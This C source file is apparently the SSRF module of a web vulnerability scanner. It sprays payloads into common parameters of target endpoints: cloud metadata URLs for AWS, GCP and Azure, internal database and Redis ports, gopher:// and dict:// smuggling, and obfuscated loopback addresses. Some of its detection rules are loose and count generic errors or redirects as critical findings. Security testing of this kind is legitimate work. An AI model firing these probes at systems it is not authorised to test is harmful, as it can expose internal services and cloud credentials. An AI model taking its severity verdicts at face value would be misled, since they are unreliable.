/*
 * OMEGA-ZERODAY HUNTER v2.0 — SSRF Detection Engine
 * Real protocol smuggling, cloud metadata probing, response diffing
 */

#include "../include/omega.h"

/* SSRF payloads with expected indicators */
static const struct {
    const char *payload;
    const char *indicator;
    const char *description;
} SSRF_PAYLOADS[] = {
    {"http://127.0.0.1", "root:", "Localhost loopback"},
    {"http://169.254.169.254/latest/meta-data/", "ami-id", "AWS metadata"},
    {"http://metadata.google.internal/computeMetadata/v1/", "metadata", "GCP metadata"},
    {"http://169.254.169.254/metadata/instance?api-version=2021-02-01", "\"compute\"", "Azure metadata"},
    {"http://127.0.0.1:6379/", "PONG", "Redis port"},
    {"http://127.0.0.1:3306/", "mysql", "MySQL port"},
    {"http://127.0.0.1:27017/", "MongoDB", "MongoDB port"},
    {"http://127.0.0.1:9200/", "cluster_name", "Elasticsearch port"},
    {"http://127.0.0.1:22/", "SSH", "SSH port"},
    {"gopher://127.0.0.1:6379/_INFO", "redis_version", "Redis via gopher"},
    {"dict://127.0.0.1:6379/info", "redis_version", "Redis via dict"},
    {NULL, NULL, NULL}
};

/* URL parameters commonly vulnerable to SSRF */
static const char *SSRF_PARAMS[] = {
    "url", "uri", "link", "href", "redirect", "redirect_uri",
    "callback", "return", "next", "continue", "dest", "destination",
    "checkout", "feed", "host", "site", "page", "path",
    "file", "document", "folder", "root", "pg", "style",
    "pdf", "template", "php_path", "doc", "image", "img",
    "val", "view", "source", "target", "reference", "domain",
    "load", "debug", "test", "admin", "gateway", "fetch",
    NULL
};

/* Detect SSRF in response */
static bool ssrf_detect(const http_response_t *resp, const char *indicator) {
    if (!resp || !resp->body || !indicator) return false;
    
    /* Direct content match */
    if (str_contains(resp->body, indicator)) return true;
    
    /* Error-based detection */
    if (str_contains(resp->body, "cURL error") || 
        str_contains(resp->body, "failed to open stream") ||
        str_contains(resp->body, "Connection refused") ||
        str_contains(resp->body, "Network is unreachable") ||
        str_contains(resp->body, "No route to host")) {
        /* Even error messages indicate SSRF potential */
        if (!str_contains(resp->body, "Invalid URL") && 
            !str_contains(resp->body, "bad URL")) {
            return true;
        }
    }
    
    /* Redirect-based detection */
    if (resp->location[0] && str_contains(resp->location, "127.0.0.1")) return true;
    
    return false;
}

/* Main SSRF test */
static int ssrf_test(const endpoint_t *ep, scan_context_t *ctx) {
    parsed_url_t parsed;
    url_parse(ep->url, &parsed);
    
    for (int p = 0; SSRF_PARAMS[p] != NULL; p++) {
        for (int i = 0; SSRF_PAYLOADS[i].payload != NULL; i++) {
            /* GET parameter injection */
            char url[OMEGA_MAX_URL_LEN];
            snprintf(url, sizeof(url), "%s?%s=%s", ep->url, SSRF_PARAMS[p], SSRF_PAYLOADS[i].payload);
            
            http_request_t req;
            memset(&req, 0, sizeof(req));
            strncpy(req.url, url, OMEGA_MAX_URL_LEN - 1);
            strncpy(req.host, parsed.host, OMEGA_MAX_HOST_LEN - 1);
            snprintf(req.path, OMEGA_MAX_PATH_LEN, "%s?%s=%s", 
                    ep->path, SSRF_PARAMS[p], SSRF_PAYLOADS[i].payload);
            req.port = parsed.port;
            req.ssl = parsed.ssl;
            req.method = HTTP_GET;
            req.timeout = OMEGA_DEFAULT_TIMEOUT;
            
            http_response_t resp;
            if (http_request(&req, &resp) == 0) {
                if (ssrf_detect(&resp, SSRF_PAYLOADS[i].indicator)) {
                    bool is_cloud = str_contains(SSRF_PAYLOADS[i].payload, "169.254") ||
                                   str_contains(SSRF_PAYLOADS[i].payload, "metadata");
                    
                    if (ctx->finding_count < OMEGA_MAX_FINDINGS) {
                        finding_t *f = &ctx->findings[ctx->finding_count];
                        memset(f, 0, sizeof(finding_t));
                        f->type = is_cloud ? FIND_SSRF_CLOUD_METADATA : FIND_SSRF_BASIC;
                        f->severity = SEV_CRITICAL;
                        f->cvss_score = is_cloud ? 9.8 : 8.6;
                        strncpy(f->url, ep->url, OMEGA_MAX_URL_LEN - 1);
                        snprintf(f->description, sizeof(f->description),
                            "SSRF via %s: %s → %s",
                            SSRF_PARAMS[p], SSRF_PAYLOADS[i].description, SSRF_PAYLOADS[i].payload);
                        snprintf(f->evidence, sizeof(f->evidence),
                            "Param: %s | Payload: %s | Indicator: %s",
                            SSRF_PARAMS[p], SSRF_PAYLOADS[i].payload, SSRF_PAYLOADS[i].indicator);
                        f->confidence = 0.92;
                        strncpy(f->cwe_id, "CWE-918", sizeof(f->cwe_id) - 1);
                        strncpy(f->engine, "SSRFOracle", sizeof(f->engine) - 1);
                        f->timestamp = time_now();
                        ctx->finding_count++;
                        ctx->critical_count++;
                        log_info("🔴 CRITICAL: SSRF at %s via %s", ep->url, SSRF_PARAMS[p]);
                    }
                    http_response_free(&resp);
                    return 1;
                }
                http_response_free(&resp);
            }
            
            /* POST body injection */
            char body[2048];
            snprintf(body, sizeof(body), "%s=%s", SSRF_PARAMS[p], SSRF_PAYLOADS[i].payload);
            
            memset(&req, 0, sizeof(req));
            strncpy(req.url, ep->url, OMEGA_MAX_URL_LEN - 1);
            strncpy(req.host, parsed.host, OMEGA_MAX_HOST_LEN - 1);
            strncpy(req.path, ep->path, OMEGA_MAX_PATH_LEN - 1);
            req.port = parsed.port;
            req.ssl = parsed.ssl;
            req.method = HTTP_POST;
            req.timeout = OMEGA_DEFAULT_TIMEOUT;
            req.body = body;
            req.body_len = strlen(body);
            strncpy(req.headers, "Content-Type: application/x-www-form-urlencoded\r\n",
                    sizeof(req.headers) - 1);
            
            if (http_request(&req, &resp) == 0) {
                if (ssrf_detect(&resp, SSRF_PAYLOADS[i].indicator)) {
                    if (ctx->finding_count < OMEGA_MAX_FINDINGS) {
                        finding_t *f = &ctx->findings[ctx->finding_count];
                        memset(f, 0, sizeof(finding_t));
                        f->type = FIND_SSRF_BASIC;
                        f->severity = SEV_CRITICAL;
                        f->cvss_score = 8.6;
                        strncpy(f->url, ep->url, OMEGA_MAX_URL_LEN - 1);
                        snprintf(f->description, sizeof(f->description),
                            "SSRF via POST param %s → %s", SSRF_PARAMS[p], SSRF_PAYLOADS[i].payload);
                        f->confidence = 0.90;
                        strncpy(f->cwe_id, "CWE-918", sizeof(f->cwe_id) - 1);
                        strncpy(f->engine, "SSRFOracle", sizeof(f->engine) - 1);
                        f->timestamp = time_now();
                        ctx->finding_count++;
                        ctx->critical_count++;
                        log_info("🔴 CRITICAL: POST SSRF at %s via %s", ep->url, SSRF_PARAMS[p]);
                    }
                    http_response_free(&resp);
                    return 1;
                }
                http_response_free(&resp);
            }
        }
    }
    return 0;
}

/* SSRF via redirect */
int ssrf_redirect(const endpoint_t *ep, scan_context_t *ctx) {
    /* Test if server follows redirects to internal hosts */
    const char *redirect_params[] = {"url", "redirect", "next", "return", "callback", NULL};
    const char *redirect_payloads[] = {
        "http://127.0.0.1", "http://169.254.169.254/latest/meta-data/",
        "http://[::1]", "http://0x7f000001", NULL
    };
    
    parsed_url_t parsed;
    url_parse(ep->url, &parsed);
    
    for (int p = 0; redirect_params[p]; p++) {
        for (int r = 0; redirect_payloads[r]; r++) {
            char url[OMEGA_MAX_URL_LEN];
            snprintf(url, sizeof(url), "%s?%s=%s", ep->url, redirect_params[p], redirect_payloads[r]);
            
            http_request_t req;
            memset(&req, 0, sizeof(req));
            strncpy(req.url, url, OMEGA_MAX_URL_LEN - 1);
            strncpy(req.host, parsed.host, OMEGA_MAX_HOST_LEN - 1);
            snprintf(req.path, OMEGA_MAX_PATH_LEN, "%s?%s=%s", 
                    ep->path, redirect_params[p], redirect_payloads[r]);
            req.port = parsed.port;
            req.ssl = parsed.ssl;
            req.method = HTTP_GET;
            req.timeout = OMEGA_DEFAULT_TIMEOUT;
            
            http_response_t resp;
            if (http_request(&req, &resp) == 0) {
                /* Check if redirect goes to internal */
                if ((resp.status_code >= 300 && resp.status_code < 400 && 
                     resp.location[0] &&
                     (str_contains(resp.location, "127.0.0.1") ||
                      str_contains(resp.location, "169.254") ||
                      str_contains(resp.location, "localhost")))) {
                    
                    if (ctx->finding_count < OMEGA_MAX_FINDINGS) {
                        finding_t *f = &ctx->findings[ctx->finding_count];
                        memset(f, 0, sizeof(finding_t));
                        f->type = FIND_SSRF_REDIRECT;
                        f->severity = SEV_CRITICAL;
                        f->cvss_score = 8.8;
                        strncpy(f->url, ep->url, OMEGA_MAX_URL_LEN - 1);
                        snprintf(f->description, sizeof(f->description),
                            "SSRF via redirect: %s → %s → %s",
                            redirect_params[p], redirect_payloads[r], resp.location);
                        f->confidence = 0.88;
                        strncpy(f->cwe_id, "CWE-918", sizeof(f->cwe_id) - 1);
                        strncpy(f->engine, "SSRFOracle", sizeof(f->engine) - 1);
                        f->timestamp = time_now();
                        ctx->finding_count++;
                        ctx->critical_count++;
                        log_info("🔴 CRITICAL: SSRF redirect at %s", ep->url);
                    }
                    http_response_free(&resp);
                    return 1;
                }
                http_response_free(&resp);
            }
        }
    }
    return 0;
}

int ssrf_run(scan_context_t *ctx) {
    if (!ctx) return -1;
    log_info("🌐 SSRFOracle: Testing for Server-Side Request Forgery...");
    
    int tested = 0;
    for (int i = 0; i < ctx->endpoint_count && i < 20; i++) {
        if (ctx->endpoints[i].status_code >= 400) continue;
        tested++;
        if (ctx->progress_callback)
            ctx->progress_callback("SSRFOracle", tested, ctx->endpoint_count > 20 ? 20 : ctx->endpoint_count,
                                  ctx->endpoints[i].path);
        ssrf_test(&ctx->endpoints[i], ctx);
        ssrf_redirect(&ctx->endpoints[i], ctx);
    }
    
    log_info("🌐 SSRFOracle: Completed %d endpoint tests", tested);
    return 0;
}
